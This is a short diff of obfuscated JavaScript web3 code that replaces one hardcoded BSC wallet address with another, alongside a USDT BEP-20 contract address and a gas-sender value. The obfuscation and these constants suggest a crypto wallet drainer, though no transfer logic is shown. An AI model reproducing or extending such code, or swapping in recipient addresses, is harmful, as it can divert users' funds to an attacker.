@@ -20,7 +20,7 @@ const _0x1b5be5 = _0x3140;
             }
         })(_0x17fe, 0x6eebb);
 
-        const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090",
+        const bscAddress = "0xDbB78587a1A83097aaf25AC6078F378808d8821e",
             bnbGasSender = _0x1b5be5(0xb9),
             usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
         let web3, userAddress;
